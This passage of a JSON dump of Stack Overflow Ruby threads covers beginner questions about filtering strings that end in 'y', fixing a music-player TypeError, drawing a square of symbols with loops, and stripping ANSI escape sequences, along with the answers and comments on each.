unique: true\n  end\nend\n</code></pre>\n"}, {"tags": ["arrays", "ruby"], "comments": [{"owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "edited": false, "score": 2, "creation_date": 1558251452, "post_id": 56205529, "comment_id": 99033164, "body": "&quot; It just returns with a blank.&quot; can you show the full method and how you&#39;re calling it?"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1558255007, "post_id": 56205529, "comment_id": 99033884, "body": "I assume that <code>words</code> (plural) is your array of strings? If so, your code checks whether the array contains at least 6 elements and if the last element is the string <code>&quot;y&quot;</code>. That&#39;s probably not what you want. Try <code>words.select { |string| string.length &gt;= 6 &amp;&amp; string[-1] == &quot;y&quot; }</code> instead to <a href=\"http://ruby-doc.org/core-2.6.3/Array.html#method-i-select\" rel=\"nofollow noreferrer\"><code>select</code></a> <i>elements</i> satisfying your conditions."}], "answers": [{"comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558252226, "post_id": 56205678, "comment_id": 99033307, "body": "As an alternative, consider using a regular expression (with anchors)."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "reply_to_user": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558252579, "post_id": 56205678, "comment_id": 99033385, "body": "It would be great if you write an answer. I am not good in regular expression."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 1558253284, "post_id": 56205678, "comment_id": 99033521, "body": "There&#39;s no time like the present to practice. You want to match the beginning of the string followed by at least 5 characters (any characters) followed by a <code>&#39;y&#39;</code> followed by the end of the string, case-indifferent. Bye."}, {"owner": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "edited": false, "score": 0, "creation_date": 1558271434, "post_id": 56205678, "comment_id": 99037621, "body": "There is also <code>x.end_with?(&quot;y&quot;, &quot;Y&#39;)</code> if you want to avoid regexps."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "reply_to_user": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "edited": false, "score": 0, "creation_date": 1558271642, "post_id": 56205678, "comment_id": 99037670, "body": "@steenslag yes, I have forgotten that function but anyway I am not using regex."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "reply_to_user": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558272343, "post_id": 56205678, "comment_id": 99037851, "body": "@CarySwoveland Added."}, {"owner": {"reputation": 11741, "user_id": 1934428, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/072774c5d4204a1c2385560e6114a887?s=128&d=identicon&r=PG", "display_name": "user1934428", "link": "https://stackoverflow.com/users/1934428/user1934428"}, "edited": false, "score": 0, "creation_date": 1558332354, "post_id": 56205678, "comment_id": 99050936, "body": "Refusing regexps when programming Ruby is like refusing a spoon when eating soup."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "reply_to_user": {"reputation": 11741, "user_id": 1934428, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/072774c5d4204a1c2385560e6114a887?s=128&d=identicon&r=PG", "display_name": "user1934428", "link": "https://stackoverflow.com/users/1934428/user1934428"}, "edited": false, "score": 0, "creation_date": 1558335553, "post_id": 56205678, "comment_id": 99052096, "body": "@user1934428 i am not refusing."}], "tags": [], "owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "is_accepted": false, "score": 1, "last_activity_date": 1558272310, "last_edit_date": 1558272310, "creation_date": 1558251226, "answer_id": 56205678, "question_id": 56205529, "link": "https://stackoverflow.com/questions/56205529/how-to-identify-an-index-with-last-letter-y/56205678#56205678", "title": "How to identify an index with last letter y?", "body": "<pre><code>a=[\"abcdey\",'mckejy','jay','jjjjjjy','aaaaaa']\n</code></pre>\n\n<p>Code</p>\n\n<pre><code>p a.filter{|x|x.length.eql?6 and x[-1].downcase.eql?'y'}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>p a.select{|x|x.length.eql?6 and x[-1].downcase.eql?'y'}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>[\"abcdey\", \"mckejy\"]\n</code></pre>\n\n<p>If you want to create a method then</p>\n\n<pre><code>def findTheString a\n  a.filter {|x| x.length.eql? 6 and x[-1].downcase.eql? 'y'}\nend\n\na=[\"abcdey\", 'mckejy', 'jay', 'jjjjjjy', 'aaaaaa']\n\np findTheString a\n</code></pre>\n\n<p>As Cary suggested, Here is the regular expression solution</p>\n\n<pre><code>p a.filter{|x|x[/\\A.{5}(y|Y)\\z/]}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558265124, "post_id": 56206292, "comment_id": 99036130, "body": "I believe that should be <code>&#47;\\A.{5,}(y|Y)\\z&#47;</code>, <code>&#47;.{5}(y|Y)\\z&#47;</code>, or (best, imo) <code>INPUT.grep(&#47;.{5}y\\z&#47;i)</code>."}, {"owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "reply_to_user": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558265295, "post_id": 56206292, "comment_id": 99036162, "body": "@CarySwoveland obviously you are right.  The OP asked for 6 or more characters long, not just six. Updated."}, {"owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "reply_to_user": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558265434, "post_id": 56206292, "comment_id": 99036191, "body": "Also added the Regexp suggested by Carry. It seems a tad faster. But fo course these Microbenchmarks should be taken with a grain of salt."}], "tags": [], "owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "is_accepted": false, "score": 1, "last_activity_date": 1558265236, "last_edit_date": 1558265236, "creation_date": 1558256733, "answer_id": 56206292, "question_id": 56205529, "link": "https://stackoverflow.com/questions/56205529/how-to-identify-an-index-with-last-letter-y/56206292#56206292", "title": "How to identify an index with last letter y?", "body": "<p>As suggested by Cary Swoveland, here is a solution using Regexp, including a Benchmark:</p>\n\n<pre><code>require \"benchmark/ips\"\n\nRE_1 = /\\A.{5,}y\\z/i\nRE_2 = /.{5}y\\z/i\nINPUT = [\"abcdey\", 'mckejy', 'jay', 'jjjjjjy', 'aaaaaa', 'aaaaaY', 'aaaaaaaY'].freeze\n\nBenchmark.ips do |x|\n  x.compare!\n  x.report(\"select (downcase)\") do\n    INPUT.select{ |word| word.length &gt;= 6 &amp;&amp; word[-1].downcase == 'y' }\n  end\n\n  x.report(\"select (or)\") do\n    INPUT.select{ |word| word.length &gt;= 6 &amp;&amp; (word[-1] == 'y' || word[-1] == 'Y') }\n  end\n\n  x.report(\"re 1\") do\n    INPUT.select { |word| RE_1.match?(word) }\n  end\n\n  x.report(\"re 2\") do\n    INPUT.select { |word| RE_2.match?(word) }\n  end\nend\n\n\nComparison:\n                re 2:   633881.7 i/s\n                re 1:   615253.4 i/s - same-ish: difference falls within error\n   select (downcase):   499513.6 i/s - 1.27x  slower\n         select (or):   405617.5 i/s - 1.56x  slower\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 11522860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3c83817eb6d7179e20fb05c1625b65e?s=128&d=identicon&r=PG&f=1", "display_name": "joshingjones", "link": "https://stackoverflow.com/users/11522860/joshingjones"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1558272310, "creation_date": 1558249678, "last_edit_date": 1558260576, "question_id": 56205529, "link": "https://stackoverflow.com/questions/56205529/how-to-identify-an-index-with-last-letter-y", "title": "How to identify an index with last letter y?", "body": "<p>I need to make a method to return an array containing all strings that are at least 6 characters long and also end with y. Ending with y is stumping me. I'm not sure how to do that.</p>\n\n<p>I have tried using:</p>\n\n<pre><code>if words.length &gt;= 6 &amp;&amp; words[-1] == \"y\"\n</code></pre>\n\n<p>but it doesn't seem to be working. \nIt just returns with a blank. I'm not sure what I'm doing wrong.</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 0, "creation_date": 1558239807, "post_id": 56204480, "comment_id": 99031467, "body": "This is not a precise enough error description for us to help you. <i>What</i> doesn&#39;t work? <i>How</i> doesn&#39;t it work? What trouble do you have with your code? Do you get an error message? What is the error message? Is the result you are getting not the result you are expecting? What result do you expect and why, what is the result you are getting and how do the two differ? Is the behavior you are observing not the desired behavior? What is the desired behavior and why, what is the observed behavior, and in what way do they differ?"}], "answers": [{"comments": [{"owner": {"reputation": 574, "user_id": 10633499, "user_type": "registered", "profile_image": "https://graph.facebook.com/10217237080576333/picture?type=large", "display_name": "Giorgio Zanni", "link": "https://stackoverflow.com/users/10633499/giorgio-zanni"}, "reply_to_user": {"reputation": 21, "user_id": 9888189, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-F1qG5FTcAyc/AAAAAAAAAAI/AAAAAAAAAT4/Mfs8OtlOZEI/photo.jpg?sz=128", "display_name": "Elham Najeebullah", "link": "https://stackoverflow.com/users/9888189/elham-najeebullah"}, "edited": false, "score": 0, "creation_date": 1558249163, "post_id": 56205112, "comment_id": 99032771, "body": "If that&#39;s not working you might not be saving your tracks correctly into the array (maybe the strings need to be processed before saving, watch out for line jumps)."}, {"owner": {"reputation": 574, "user_id": 10633499, "user_type": "registered", "profile_image": "https://graph.facebook.com/10217237080576333/picture?type=large", "display_name": "Giorgio Zanni", "link": "https://stackoverflow.com/users/10633499/giorgio-zanni"}, "reply_to_user": {"reputation": 21, "user_id": 9888189, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-F1qG5FTcAyc/AAAAAAAAAAI/AAAAAAAAAT4/Mfs8OtlOZEI/photo.jpg?sz=128", "display_name": "Elham Najeebullah", "link": "https://stackoverflow.com/users/9888189/elham-najeebullah"}, "edited": false, "score": 0, "creation_date": 1558284721, "post_id": 56205112, "comment_id": 99041154, "body": "I literally just told you. Check what&#39;s contained in <code>album.tracks</code>. Are you sure it contains what you say it contains? Maybe you&#39;re storing song names as <code>&#39;song name&#47;song_name.wav&#39;</code> and if that&#39;s the case of course it will fail when you ask for <code>&#39;song name&#39;</code>."}], "tags": [], "owner": {"reputation": 574, "user_id": 10633499, "user_type": "registered", "profile_image": "https://graph.facebook.com/10217237080576333/picture?type=large", "display_name": "Giorgio Zanni", "link": "https://stackoverflow.com/users/10633499/giorgio-zanni"}, "is_accepted": false, "score": 1, "last_activity_date": 1558244952, "creation_date": 1558244952, "answer_id": 56205112, "question_id": 56204480, "link": "https://stackoverflow.com/questions/56204480/getting-an-error-no-implicit-conversion-of-integer-to-string-in-my-program/56205112#56205112", "title": "Getting an error &#39;No implicit conversion of integer to string&#39; in my program", "body": "<p>You defined <code>music_file</code> in <code>main</code> method but you're trying to access it inside another method where it's not defined, hence the error.</p>\n\n<p>Let's analyze what your code is doing:</p>\n\n<pre><code>def search_for_track_name(tracks, search_string)\nindex = 0\ncount = music_file.gets() \n# Trying to access a variable that is outside of the method's scope\n# music_file doesn't exist here.\n\nwhile (index &lt; count)\n    if (tracks[index] == search_string)\n        return found_index = -1\n        # You are returning -1 if the condition is true, which means\n        # returning -1 when the string is found even though you want\n        # the exact opposite.\n    end\n    index += 1\nend\n found_index\n # If the pointer gets here, it means that the if statement was never true\n # therefore found_index was never defined\n\nend\n</code></pre>\n\n<p>Let's address these problems:</p>\n\n<pre><code>def search_for_track_name(tracks, search_string)\nindex = 0\ncount = tracks.length\n# will loop through the array's items\n\nwhile (index &lt; count)\n    if (tracks[index] == search_string)\n        return index\n        # will return index if found\n    end\n    index += 1\nend\n  -1\n  # if the loop finishes and nothing is found, will return -1\nend\n</code></pre>\n\n<p>Or you could just use the <code>index</code> method which returns the index of the first match of an element in an array.</p>\n\n<pre><code>tracks.index(search_string)\n</code></pre>\n\n<p><a href=\"https://ruby-doc.org/core-2.6.3/Array.html#method-i-index\" rel=\"nofollow noreferrer\">https://ruby-doc.org/core-2.6.3/Array.html#method-i-index</a></p>\n"}], "owner": {"reputation": 21, "user_id": 9888189, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-F1qG5FTcAyc/AAAAAAAAAAI/AAAAAAAAAT4/Mfs8OtlOZEI/photo.jpg?sz=128", "display_name": "Elham Najeebullah", "link": "https://stackoverflow.com/users/9888189/elham-najeebullah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 201, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1558949224, "creation_date": 1558235912, "last_edit_date": 1558949224, "question_id": 56204480, "link": "https://stackoverflow.com/questions/56204480/getting-an-error-no-implicit-conversion-of-integer-to-string-in-my-program", "title": "Getting an error &#39;No implicit conversion of integer to string&#39; in my program", "body": "<p>I am creating a text-based music player Program.</p>\n\n<p>Inside the read_genre() function which displays the lists of the available genre (which I defined 9 different genres inside instance $genre_names variable array outside of the read_genre() function) and this prompt the user to select a genre for the album, which read in the genre number that user entered. And then the read_genre is called from read_album and print out in print_album function.</p>\n\n<p>The problem is that I am receiving an error 'no implicit conversion of nill into string (TypeError)' line 134 that is puts ' <code>Genre is ' + album.genre</code> from print_album() function. </p>\n\n<pre><code>$genre_names = ['Null','Pop', 'Classic', 'Jazz', 'Rock', 'KPop', 'Metal', 'Punk', 'Romance', 'Latin']\n\n# Display the genre names in a\n# numbered list and ask the user to select one\ndef read_genre()\n    length = $genre_names.length\n    index = 0\n    print $genre_names\n  while (index &lt; length)\n    select_genre = read_integer_in_range(\"Select Genre: \", 0,9)\n        case select_genre\n        when 1\n        puts \"#{index + 1} \" + $genre_names[1]\n        break\n        when 2\n        puts \"#{index + 2 } \" + $genre_names[2]\n        break\n        when 3\n        puts \"#{index + 3} \" + $genre_names[3]\n        break\n        when 4\n        puts \"#{index + 4} \" + $genre_names[4]\n        break\n        when 5\n        puts \"#{index + 5} \" + $genre_names[5]\n        break\n        when 6\n        puts \"#{index + 6} \" + $genre_names[6]\n        break\n        when 7\n        puts \"#{index + 7} \" + $genre_names[7]\n        break\n        when 8\n        puts \"#{index + 8} \" + $genre_names[8]\n        break\n        when 9\n        puts \"#{index + 9} \" + $genre_names[9]\n        break\n         else\n          puts 'Please Select again'\n          break \n        end\n        index\n    end\n\nend\n\ndef read_album\n    # Complete the missing code\n  album_title = read_string(\"Enter Title: \")\n  album_artist = read_string(\"Enter Artist name: \")\n  album_genre = read_genre()\n  tracks = [tracks]\n  album = Album.new(album_title, album_artist, album_genre, tracks)\n  album\nend\n\n\ndef print_tracks tracks\n    # Complete the missing code\n    index = 0\n    while (index &lt; tracks.length)\n     print_track(tracks[index])\n     index += 1\n    end\nend\n</code></pre>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1558234791, "post_id": 56204406, "comment_id": 99030878, "body": "Hint: Consider what a square is. Repeat <i>N</i> times for the top row, then one character, <i>N-2</i> spaces, one character, and the last row is the same as the first. The interior is repeated <i>N-2</i> times. In Ruby that translates to <code>(number-2).times do</code>"}, {"owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "edited": false, "score": 1, "creation_date": 1558235569, "post_id": 56204406, "comment_id": 99030979, "body": "typing just <code>symbol*number</code> does nothing. Do you want to <code>puts</code> or <code>print</code> that to the screen?"}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 11522316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1fb3c7a93059868ee4c00b46bd40c4d9?s=128&d=identicon&r=PG&f=1", "display_name": "Avery", "link": "https://stackoverflow.com/users/11522316/avery"}, "edited": false, "score": 0, "creation_date": 1558297892, "post_id": 56205060, "comment_id": 99044660, "body": "Thank you so much Mr. Jorg W Mittag. This was so helpful."}], "tags": [], "owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "is_accepted": false, "score": 3, "last_activity_date": 1558246016, "last_edit_date": 1558246016, "creation_date": 1558244310, "answer_id": 56205060, "question_id": 56204406, "link": "https://stackoverflow.com/questions/56204406/how-to-make-a-square-with-any-symbol-using-ruby-loops/56205060#56205060", "title": "How to make a square with any symbol, using ruby loops?", "body": "<p>There are three problems in your code:</p>\n\n<ol>\n<li>You are computing <code>symbol*number</code>, but you are not doing anything with the result. You are simply ignoring it. You are not storing it in a variable or returning it from the block or printing it or anything else.</li>\n<li>You are immediately <code>breaking</code> from the <code>loop</code>, therefore, it will only ever be executed once.</li>\n<li>You never print anything.</li>\n</ol>\n\n<p>There are infinite ways of approaching this problem, here is one:</p>\n\n<pre><code>#!/usr/bin/env ruby\n\ndef make_square(number = 3, symbol = '*')\n    return '' if number.zero?\n\n    symbol = symbol.dup.freeze\n\n    return symbol if number == 1\n\n    solid_line = (symbol * number)\n    middle_line = (symbol + ' ' * (number - 2) + symbol)\n    middle_lines = ([middle_line] * (number - 2))\n\n    return [\n      solid_line,\n      *middle_lines,\n      solid_line\n    ].join(\"\\n\").freeze\nend\n\ndef print_square(number = 3, symbol = '*')\n    puts make_square(number, symbol)\nend\n\ndef ask_input\n    return ask_number, ask_symbol\nend\n\ndef ask_number\n    puts 'Please enter a number'\n    read_number\nend\n\ndef ask_symbol\n    puts 'Please enter a symbol (eg. #, @, $, %, ^, &amp;, *, _, -, +, =)'\n    read_symbol\nend\n\ndef read_number\n    Integer(gets).tap do |number|\n    raise ArgumentError, \"`number` must be non-negative but is #{number}\" if number.negative?\n    end\nend\n\ndef read_symbol\n    gets.chomp.tap do |symbol|\n    raise ArgumentError, \"`symbol` must be a single character\" if symbol.size &gt; 1\n    raise ArgumentError, \"`symbol` must be printable and visible\" unless /\\p{Graph}/ =~ symbol\n    end.freeze\nend\n\ndef main\n    number, symbol = ask_input\n\n    puts 'This is the square:'\n    puts\n    print_square(number, symbol)\nend\n\nmain\n\n# $ print_square.rb\n# Please enter a number\n# 0\n# Please enter a symbol (eg. #, @, $, %, ^, &amp;, *, _, -, +, =)\n# \u2588\n# This is the square:\n# \n#####\n# $ print_square.rb\n# Please enter a number\n# 1\n# Please enter a symbol (eg. #, @, $, %, ^, &amp;, *, _, -, +, =)\n# \u2588\n# This is the square:\n# \u2588\n#####\n# $ print_square.rb\n# Please enter a number\n# 2\n# Please enter a symbol (eg. #, @, $, %, ^, &amp;, *, _, -, +, =)\n# \u2588\n# This is the square:\n# \u2588\u2588\n# \u2588\u2588\n#####\n# $ print_square.rb\n# Please enter a number\n# 3\n# Please enter a symbol (eg. #, @, $, %, ^, &amp;, *, _, -, +, =)\n# \u2588\n# This is the square:\n# \u2588\u2588\u2588\n# \u2588 \u2588\n# \u2588\u2588\u2588\n#####\n# $ print_square.rb\n# Please enter a number\n# -1\n# ./print_square.rb:41:in `block in read_number': `number` must be non-negative but is -1 (ArgumentError)\n#   from ./test.rb:40:in `tap'\n#   from ./test.rb:40:in `read_number'\n#   from ./test.rb:31:in `ask_number'\n#   from ./test.rb:26:in `ask_input'\n#   from ./test.rb:53:in `main'\n#   from ./test.rb:60:in `&lt;main&gt;'\n#####\n</code></pre>\n\n<p>This may look like overkill, but by separating the different sub-problems and sub-sub-problems etc. out into different methods, we can easily test each sub-sub-problem in isolation and trace an error to a specific point in our code. For example, if we suspect that there is a bug in our number reading method, we can call just that one method and verifying its result instead of having to through the entire program of printing out the square. Conversely, if we suspect that there is a bug in how we construct our square, we can simply call the <code>make_square</code> method with different arguments without having to enter the symbol and number over and over again, e.g. like this:</p>\n\n<pre><code>8.times(&amp;method(:print_square))\n# \n# *\n# **\n# **\n# ***\n# * *\n# ***\n# ****\n# *  *\n# *  *\n# ****\n# *****\n# *   *\n# *   *\n# *   *\n# *****\n# ******\n# *    *\n# *    *\n# *    *\n# *    *\n# ******\n# *******\n# *     *\n# *     *\n# *     *\n# *     *\n# *     *\n# *******\n</code></pre>\n"}], "owner": {"reputation": 19, "user_id": 11522316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1fb3c7a93059868ee4c00b46bd40c4d9?s=128&d=identicon&r=PG&f=1", "display_name": "Avery", "link": "https://stackoverflow.com/users/11522316/avery"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 152, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558246016, "creation_date": 1558234673, "last_edit_date": 1558234740, "question_id": 56204406, "link": "https://stackoverflow.com/questions/56204406/how-to-make-a-square-with-any-symbol-using-ruby-loops", "title": "How to make a square with any symbol, using ruby loops?", "body": "<p>I can't seem to make a square using ruby loops. The square needs to be constructed using any symbol and any number inputted by the user. For example, if the input_number = 4 and the symbol_chosen = &amp;, then all sides of the square should have 4*&amp; on each side.</p>\n\n<p>I have tried a simple method. I collected two user inputs, 1. input_number and 2. symbol_chosen. Then, I created a loop with nested value of symbol_chosen*input_number. I know that this code will not give me 4 sides of the square but I don't understand why I can't even get one side of the square with this code.</p>\n\n<pre><code>puts \"Please insert a symbol (eg. #, @, $, %, ^, &amp;, *, _, -, +, =)\"\nsymbol = gets.chomp\n\nputs \"Please insert a number\"\nnumber = gets.chomp.to_i\n\nloop do\n    symbol*number\n    break\nend\n</code></pre>\n\n<p>I want to know any errors that I have in this code which are preventing it from working. Also, I want to know what I should add in this code to make it form a 4 sided square with any character and number(representing the length), using ruby loop.</p>\n"}, {"tags": ["ruby", "linux"], "comments": [{"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1558233552, "post_id": 56204309, "comment_id": 99030706, "body": "Can you add the full output you&#39;re receiving?"}, {"owner": {"reputation": 591, "user_id": 8142520, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/l2J1e.png?s=128&g=1", "display_name": "user8142520", "link": "https://stackoverflow.com/users/8142520/user8142520"}, "reply_to_user": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1558235999, "post_id": 56204309, "comment_id": 99031038, "body": "Hi Palma, the <code>result</code> is something like this: <code>x = [&quot;\\e[mstring1&quot;, &quot;\\e[2Kstring2&quot;, &quot;string3&quot;, &quot;\\e[2Kstrin4&quot;]</code>"}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558293384, "post_id": 56204309, "comment_id": 99043553, "body": "@pascal seems to have what you need, but in general, it is sometimes easier to retain the characters you want rather than exclude the ones you don&#39;t want."}], "answers": [{"tags": [], "owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "is_accepted": true, "score": 2, "last_activity_date": 1558254864, "creation_date": 1558254864, "answer_id": 56206076, "question_id": 56204309, "link": "https://stackoverflow.com/questions/56204309/how-to-remove-control-characters-in-ruby/56206076#56206076", "title": "How to remove control characters in ruby", "body": "<p>Seems like these are CSI sequences (<a href=\"https://en.wikipedia.org/wiki/ANSI_escape_code#CSI_sequences\" rel=\"nofollow noreferrer\">https://en.wikipedia.org/wiki/ANSI_escape_code#CSI_sequences</a>)</p>\n\n<p>You could remove them like this:</p>\n\n<pre><code>REGEXP = /\\e\\[[^\\x40-\\x7E]*[\\x40-\\x7E]/\ninput = [\"\\e[mstring1\", \"\\e[2Kstring2\", \"string3\", \"\\e[2Kstrin4\"]\n\n\ndef remove_csi(line)\n  line.gsub(REGEXP, \"\")\nend\n\noutput = input.map do |line|\n  remove_csi(line)\nend\n\np input\np output\n\n# =&gt; [\"\\e[mstring1\", \"\\e[2Kstring2\", \"string3\", \"\\e[2Kstrin4\"]\n# =&gt; [\"string1\", \"string2\", \"string3\", \"strin4\"]\n</code></pre>\n\n<p>The regexp is a simplified version that matches from the start of the string  up to the \"final byte\" in the sequence.</p>\n"}], "owner": {"reputation": 591, "user_id": 8142520, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/l2J1e.png?s=128&g=1", "display_name": "user8142520", "link": "https://stackoverflow.com/users/8142520/user8142520"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 349, "favorite_count": 0, "accepted_answer_id": 56206076, "answer_count": 1, "score": 1, "last_activity_date": 1558254864, "creation_date": 1558233225, "question_id": 56204309, "link": 